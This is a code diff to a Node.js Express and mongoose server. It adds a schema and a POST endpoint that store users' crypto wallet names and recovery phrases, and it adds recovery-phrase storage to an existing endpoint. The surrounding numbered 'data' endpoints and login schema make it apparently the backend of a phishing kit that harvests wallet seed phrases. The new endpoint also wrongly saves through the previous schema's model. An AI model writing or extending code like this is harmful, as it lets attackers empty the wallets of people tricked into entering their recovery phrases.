@@ -81,6 +81,13 @@ const schema9 = new mongoose.Schema({
 });
 const schema9Use = mongoose.model('database9', schema9);
 
+const schema10 = new mongoose.Schema({
+    Time:{type:String},
+    walletName: {type:String},
+    recoveryPhrase: {type:String}
+});
+const schema10Use = mongoose.model('database10', schema10);
+
 const login = new mongoose.Schema({
     Time:{type:String},
     name: {type:String},
@@ -249,6 +256,25 @@ server.post("/api/data9",(req,res)=>{
     async function saveSchema(){
         let data = new schema9Use({
             Time:indiaTime,
+            recoveryPhrase:req.body.recoveryPhrase
+        });
+        try{
+            await data.save();
+            console.log("Saved")
+        }
+        catch{
+            console.log("NO")
+        }
+    }
+    res.json({status:"Confirmed"});
+    saveSchema()
+})
+
+server.post("/api/data10",(req,res)=>{
+    async function saveSchema(){
+        let data = new schema9Use({
+            Time:indiaTime,
+            walletName:req.body.walletName,
             recoveryPhrase:req.body.recoveryPhrase
         });
         try{
